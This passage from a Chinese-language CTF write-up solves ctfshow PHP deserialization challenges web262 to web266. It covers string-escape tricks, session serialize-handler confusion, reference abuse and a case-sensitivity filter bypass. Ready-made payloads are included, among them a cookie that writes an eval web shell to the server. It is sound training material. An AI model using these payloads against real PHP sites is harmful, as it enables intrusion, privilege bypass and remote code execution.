class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span></code></pre><p>正确做法应该是运用<strong>反序列化字符串逃逸</strong>，运用的思想跟sql注入的闭合相似</p><p>我们这里有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。</p><p>我们只能给from，msg，to传递值，即这三个属性是可控的</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>假如我们向to属性传递 <strong>t&#x3D;3”;s:5:”token”;s:5:”user”;}</strong> 字符串就变为了下面这样</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;user&quot;;&#125;</code></pre><p>我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。</p><p>反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。</p><p>这时候题目中的替换字符函数可以帮助到我们</p><pre class="language-none"><code class="language-none">$umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></pre><p>str_replace会将fuck替换为loveU，且替换是在序列化之后进行，也就是说，<strong>实际字符串长度增加了1，但标明的字符串长度任然为原值</strong></p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 替换前s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;&#x2F;&#x2F; 替换后s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</code></pre><p>通过这种方法，我们就可以凭空增加字符，来成功进行闭合</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x2F;&#x2F; 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸</code></pre><p>最终我们的payload为</p><pre class="language-none"><code class="language-none">f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h4 id="web263-Session反序列化"><a href="#web263-Session反序列化" class="headerlink" title="web263(Session反序列化)"></a>web263(Session反序列化)</h4><p>刚开始以为弱密码，但是成功，于是扫描到备份文件<code>www.zip</code></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//超过5次禁止登陆</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"登陆失败次数超过限制"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>inc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"使用"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"登陆"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"成功"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"失败"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>inc.php有file_put_contents，可写木马，user控制文件名，pass写一句话</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 指定储存的路径session<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 指定储存时使用的函数（默认是file）session<span class="token operator">.</span>auto_start boolensession<span class="token operator">.</span>serialize_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 定义序列化和反序列化的处理器的名字，默认是<span class="token function">php</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token number">.4</span>后改为php_serialize<span class="token punctuation">)</span></code></pre><p>使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p><ul><li><p>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p></li><li><p>php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值</p></li><li><p>php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</p><blockquote><p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p></blockquote></li></ul><p>那么思路就很清晰了，首先在index.php中的 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。<br>构造 <code>payload</code>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);phpinfo();?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span></code></pre><p>访问index.php时修改Cookie并发送，然后访问check.php触发反序列化，最后在根目录下<code>/log-a.php</code>刚开始文件成功写入了，没法命令执行，木马后面加个<code>phpinfo()</code>就可以了，很奇怪</p><h4 id="web264-Session反序列化字符逃逸"><a href="#web264-Session反序列化字符逃逸" class="headerlink" title="web264(Session反序列化字符逃逸)"></a>web264(Session反序列化字符逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>这次相比 <code>web262</code> 有了 <code>session</code> 的限制，就不能自己构造了，用起来反序列化字符串逃逸。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>f<span class="token operator">=</span>aaa<span class="token operator">&amp;</span>m<span class="token operator">=</span>bbb<span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在向index.php发送之后得到回显Your message has been sent，然后访问message.php（记得Cookie加上msg）得到flag</p><h4 id="web265-引用"><a href="#web265-引用" class="headerlink" title="web265(引用 &amp;)"></a>web265(引用 &amp;)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>如果要靠输入的 <code>$password</code> 去和 <code>md5(mt_rand())</code> 碰撞，几乎是不可能的。这里需要用到 <code>php</code> 的引用，使得 <code>$password = </code></p><p><code>&amp;$token;</code>，那么 <code>$password === $token</code> 就没问题了。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload：<span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowAdmin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>token<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BR<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web266-PHP大小写"><a href="#web266-PHP大小写" class="headerlink" title="web266( PHP大小写)"></a>web266( PHP大小写)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error <span class="token interpolation"><span class="token variable">$ctfshowo</span></span>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong><a href="https://blog.csdn.net/qq_41445224/article/details/88890323">file_get_contents(‘php:&#x2F;&#x2F;input’)</a></strong></p><p>在用php写接口的时候，通常会将请求的数据通过json的形式发送到指定的请求地址处，此时的file_get_contents(‘php:&#x2F;&#x2F;input’)<br>主要是用来获取请求的原始数据</p><p>其与POST的区别如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token variable">$_POST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>“name”<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> “zhangsan” <span class="token punctuation">[</span>“pwd”<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> “zhangsan” <span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php<span class="token punctuation">:</span><span class="token comment">//input-------------</span>name<span class="token operator">=</span>zhangsan<span class="token operator">&amp;</span>pwd<span class="token operator">=</span>zhangsan</code></pre><p>只要序列化ctfshow类让他反序列之后触发__destruct()函数即可得到flag</p><p>由于过滤了<code>ctfshow</code>但是这里用的是<code>cTFSHOW</code>，在PHP中，类不区分大小写；所以绕过了过滤。</p><p>这里涉及到一个 <code>php</code> 常识：<a href="https://www.cnblogs.com/zrp2013/p/3607581.html">PHP大小写：函数名和类名不区分,变量名区分</a>。</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string 